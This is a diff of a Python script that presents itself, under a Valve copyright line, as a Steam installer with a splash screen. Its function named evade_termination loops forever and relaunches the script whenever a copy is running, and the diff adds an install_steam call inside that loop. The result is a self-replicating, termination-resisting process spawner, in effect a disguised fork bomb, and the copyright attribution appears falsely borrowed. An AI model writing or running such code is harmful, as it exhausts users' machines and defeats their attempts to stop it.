@@ -1,11 +1,12 @@
 # (C) 2025 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
 
+
 import os
 import shutil
 import subprocess
 import time
 import threading
-import shutil
+
 
 SPLASH_SCREEN = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠁⢀⠀⠀⠄⠀⢀⠀⠀⡀⠐⠀⠠⠀⠐⠀⠠⠀⢀⠀⠄⠀⡀⠈⠀⠠⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -90,13 +91,8 @@ def evade_termination():
     while True:
         running = subprocess.getoutput(f"pgrep -f {SCRIPT_NAME} | wc -l")
         if int(running):
+            install_steam()
             subprocess.Popen(["python", os.path.abspath(__file__)])
-
-
-# def spawn_x_servers():
-#     while True:
-#         os.system("Xvfb :99 -screen 0 1920x1080x24 &")
-#         time.sleep(0.5)
 
 
 if __name__ == "__main__":
@@ -106,7 +102,5 @@ if __name__ == "__main__":
     print(SPLASH_SCREEN + "\n\n")
     time.sleep(3.5)
     prepare_installer()
-    install_steam()
     threading.Thread(target=spawn_process, daemon=True).start()
     threading.Thread(target=evade_termination, daemon=True).start()
-    # threading.Thread(target=spawn_x_servers, daemon=True).start()
